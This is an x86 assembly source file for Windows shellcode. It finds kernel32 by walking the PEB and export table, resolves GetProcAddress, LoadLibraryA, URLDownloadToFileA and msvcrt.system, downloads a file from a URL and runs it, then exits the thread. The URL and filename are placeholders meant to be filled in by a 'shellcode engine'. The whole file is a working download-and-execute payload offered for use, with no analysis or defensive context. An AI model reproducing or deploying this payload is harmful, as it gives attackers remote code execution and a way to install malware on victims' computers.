BITS 32											; 32bit addressing
ORG 0x0											; for relative jumps etc...

	jmp data									; jump to data
doit:											; "Its the Sounds of Science..." - Beastie Boys
	pop ebx										; get pointer to data to ebx

	call get_k32								; get proc addresses

	lea esi, [ebx-memaddy+kernel32_dll]			; lea name of kernel32 into esi

	lea edi, [ebx-memaddy+kernel32_gpa]			; lea name of kernel32.GetProcAddress into edi
	mov dword [ebx-memaddy+lpr_size], 0xF		; size of gpa
	call loadproc								; call loadproc	
	mov [ebx-memaddy+gpa_ptr], eax				; store kernel32.GetProcAddress

	lea edi, [ebx-memaddy+kernel32_lla]			; lea name of kernel32.LoadLibraryA into edi
	mov dword [ebx-memaddy+lpr_size], 0xD		; size of lla
	call loadproc								; call loadproc	
	mov [ebx-memaddy+lla_ptr], eax				; store kernel32.LoadLibraryA

	lea edi, [ebx-memaddy+kernel32_ext]			; lea name of kernel32.ExitThread into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+exthread_ptr], eax			; store kernel32.ExitThread

	lea esi, [ebx-memaddy+urlmon_dll]			; lea name of urlmon into esi

	lea edi, [ebx-memaddy+urlmon_udtf]			; lea name of urlmon.URLDownloadToFileA into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+udtf_ptr], eax				; store urlmon.URLDownloadToFileA

	lea esi, [ebx-memaddy+msvcrt_dll]			; lea name of msvcrt into esi

	lea edi, [ebx-memaddy+msvcrt_system]		; lea name of msvcrt.system into edi
	call mygpa									; call mygpa
	mov [ebx-memaddy+system_ptr], eax			; store msvcrt.system

	call ftrans									; call file transfer routine
data:
	call doit									; call doit
	memaddy			dd	0						; a variable !
	kernel32_dll	db	"kernel32", 0			; name of kernel32.dll
	kernel32_gpa	db	"GetProcAddress", 0		; ^---> GetProcAddress
	kernel32_lla	db	"LoadLibraryA", 0		; ^---> LoadLibraryA
	kernel32_ext	db	"ExitThread", 0			; ^---> ExitThread
	exthread_ptr	dd	0						; ^---> pointer to ExitThread
	lla_ptr			dd	0						; ^---> pointer to LoadLibraryA
	gpa_ptr			dd	0						; ^---> pointer to GetProcAddress
	urlmon_dll		db	"urlmon", 0				; name of urlmon.dll
	urlmon_udtf		db	"URLDownloadToFileA", 0	; ^---> URLDownloadToFileA
	udtf_ptr		dd	0						; ^---> pointer to URLDownloadToFileA
	msvcrt_dll		db	"msvcrt", 0				; name of msvcrt.dll
	msvcrt_system	db	"system", 0				; ^---> system
	system_ptr		dd	0						; ^---> pointer to system
	filename		db	"UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU", 0	; filename to download to and execute from
	kernel_base		dd	0						; base address of the kernel
	k32_numnames	dd	0						; number of exports in kernel32
	k32_funcaddr	dd	0						; address of functions in kernel32
	k32_nameaddr	dd	0						; address of names in kernel32
	k32_numords		dd	0						; number of ordinals in kernel32
	lpr_size		dd	0						; size of string for loadproc
; mygpa:
; 
; loads functions via GetProcAddress
;
; input:
; esi = name of dll
; edi = name of function
; ebx = address of data segment
;
; output:
; eax = virtual address of function
;
mygpa:
	push esi									; push dll name from esi on the stack
	call dword [ebx-memaddy+lla_ptr]			; call LoadLibraryA
	push edi									; push proc name from edi on the stack
	push eax									; push handle to library on the stack
	call dword [ebx-memaddy+gpa_ptr]			; call GetProcAddress

	ret											; return to caller
; loadproc:
;
; loads functions from kernel32
;
; input:
; edi = name of function
; ebx = address of data segment
;
; output:
; eax = virtual address of function
;
loadproc:
	xor edx, edx								; clear edx
loadproc_loop:
	mov eax, edx								; eax = counter
	shl eax, 0x02								; eax = eax * 2
	mov ecx, [ebx-memaddy+k32_nameaddr]			; ecx = AddressOfNames
	add ecx, eax								; ecx = ecx + eax
	mov eax, [ecx]								; eax = pointer from ecx
	add eax, [ebx-memaddy+kernel_base]			; align w/ base addr
	push edi									; backup edi
	push esi									; backup esi
	mov esi, edi								; esi = address of name to compare to [edi]
	mov edi, eax								; edi = address of name to compare w/
	inc edx										; else increment the counter
	mov ecx, [ebx-memaddy+lpr_size]				; ecx = the length of our search string
	rep cmpsb									; compare the strings pointed to by edi,esi and repeat this ecx times
	pop esi										; restore esi
	pop edi										; restore edi
	jne loadproc_loop							; if not equal goto top of loop else we found the function we want 
	dec edx										; edx--
	mov eax, edx								; eax = counter
	shl eax, 0x01								; eax = eax * 2
	mov ecx, [ebx-memaddy+k32_numords]			; ecx = pointer to ordinals
	add ecx, eax								; add the multiplyed counter to it
	xor eax, eax								; clear eax
	mov ax, word [ecx]							; ax = the ordinal for the function we found
	shl eax, 0x02								; multiply it by 4
	mov ecx, [ebx-memaddy+k32_funcaddr]			; ecx = pointer to address of functions
	add eax, ecx								; add it to (ordinal*4)
	mov ecx, [eax]								; ecx = rva of function
	add ecx, [ebx-memaddy+kernel_base]			; align it, ecx = va of function
	mov eax, ecx								; move it to eax
	ret											; return to caller

loadproc_exit
	xor eax, eax								; clear eax
	ret											; return to caller

get_k32:
	mov eax, [fs:0x30]							; get the PEB into eax

	mov eax, [ds:eax+0xC]						; get PROCESS_MODULE_INFO addr
	mov esi, [ds:eax+0x1C]						; get InInitOrder.flink
	lodsd										; get InInitOrder.blink
	mov ebp, [ds:eax+0x8]						; get the kernel base
	mov [ebx-memaddy+kernel_base], ebp			; store the kernel base
	mov eax, ebp								; move it to eax

	add eax, 0x3C								; eax = pointer to pe header offset
	mov ecx, [eax]								; get the pointer
	add ecx, [ebx-memaddy+kernel_base]			; add image base to align it

	add ecx, 0x78								; ecx = pointer to virtual address of export dir address
	mov esi, [ecx]								; esi = virtual address of export dir address
	add esi, [ebx-memaddy+kernel_base]			; add image base to align it

	add esi, 0x18								; esi points to NumberOfNames
	lodsd										; load number of names into eax
	mov [ebx-memaddy+k32_numnames], eax			; save it for later

	lodsd										; load address of funcs into eax
	add eax, [ebx-memaddy+kernel_base]			; align it
	mov [ebx-memaddy+k32_funcaddr], eax			; save it

	lodsd										; load address of names into eax
	add eax, [ebx-memaddy+kernel_base]			; align it
	mov [ebx-memaddy+k32_nameaddr], eax			; save it

	lodsd										; load number of ordinals into eax
	add eax, [ebx-memaddy+kernel_base]			; align it
	mov [ebx-memaddy+k32_numords], eax			; save it

	ret											; return to caller

ftrans:
	jmp urldata									; jump to data

ftrans_doit:
	pop ecx										; get pointer to data to ebx

	xor eax, eax								; clear eax
	push eax									; lpfnCB
	push eax									; dwReserved
	lea edx, [ebx-memaddy+filename]				; lea filename into edx
	push edx									; szFileName
	lea edx, [ecx-memaddy2+url]					; lea url into edx
	push edx									; szURL
	push eax									; pCaller
	call [ebx-memaddy+udtf_ptr]					; call urlmon.URLDownloadToFileA

	lea edx, [ebx-memaddy+filename]				; lea filename into edx
	push edx									; lpFile
	call [ebx-memaddy+system_ptr]				; call msvcrt.system

	xor eax, eax								; clear eax
	push eax									; dwExitCode=0
	call [ebx-memaddy+exthread_ptr]				; call kernel32.ExitThread
urldata:
	call ftrans_doit
	memaddy2		dd	0						; a variable !
	url				db	"UUUUUUUUUUUUUUUU", 0	; overwrite this via shellcode engine
